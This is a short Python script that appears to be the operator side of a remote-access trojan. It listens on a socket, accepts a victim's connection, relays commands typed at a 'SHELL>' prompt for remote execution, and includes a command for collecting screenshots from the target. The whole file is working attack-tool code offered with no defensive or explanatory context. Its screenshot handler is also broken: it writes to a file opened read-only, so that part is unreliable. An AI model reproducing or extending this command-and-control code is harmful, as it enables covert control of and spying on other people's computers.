import socket, os, threading

IP = "192.168.0.2"
PORT = 6667
BUFFER = 1024

os.system("cls")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
server.bind((IP, PORT))
print("server runing on ip:{0} and port:{1}".format(IP,PORT))
print("\n to send server commands type: /[command]}")
server.listen(1)
conn, addr = server.accept()
print("conn recived from:{0}".format(addr))
if conn:
    while True:
        cmd = input("SHELL> ")
        if cmd == "/exit":
            conn.send("exit".encode("utf-8"))
            break
        if cmd == "/stay":
            print("[/] await the pc start!")
        if cmd == "/screenlog":
            print("[-] awaiting data ...")
            data = conn.recv(BUFFER)
            with open('screenshot.jpg', 'rb') as f:
                try:
                    f.write(data.decode('utf-8'))
                    print("data recived and photo saved")
                except:
                    print("error to decode the img!")
        conn.send((cmd).encode('utf-8'))
        output = conn.recv(BUFFER).decode('utf-8')
        print(output)
server.close()
exit()
        
        

    